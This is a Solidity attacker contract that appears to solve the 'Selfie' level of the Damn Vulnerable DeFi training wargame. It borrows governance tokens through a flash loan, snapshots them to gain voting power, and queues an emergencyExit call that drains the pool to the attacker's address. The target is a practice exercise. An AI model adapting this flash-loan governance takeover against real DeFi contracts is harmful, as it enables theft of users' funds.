// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../DamnValuableTokenSnapshot.sol';
import '@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol';
import '../DamnValuableTokenSnapshot.sol';

import './SelfiePool.sol';

/**
 * @title Mohamad Hammoud
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SimpleGovernanceAttacker is IERC3156FlashBorrower {
  SelfiePool selfiePool;
  SimpleGovernance simpleGovernance;
  DamnValuableTokenSnapshot token;
  address owner;

  constructor(
    SelfiePool selfiePool_,
    SimpleGovernance simpleGovernance_,
    DamnValuableTokenSnapshot token_,
    address owner_
  ) {
    selfiePool = selfiePool_;
    simpleGovernance = simpleGovernance_;
    token = token_;
    owner = owner_;
  }

  function attack(uint256 amount) external {
    selfiePool.flashLoan(this, address(token), amount, '');
  }

  function onFlashLoan(
    address initiator,
    address token_,
    uint256 amount_,
    uint256 fee,
    bytes calldata data
  ) external returns (bytes32) {
    token.snapshot();

    simpleGovernance.queueAction(
      address(selfiePool),
      0,
      abi.encodeWithSignature('emergencyExit(address)', owner)
    );

    token.approve(msg.sender, amount_ + fee);
    return keccak256('ERC3156FlashBorrower.onFlashLoan');
  }
}
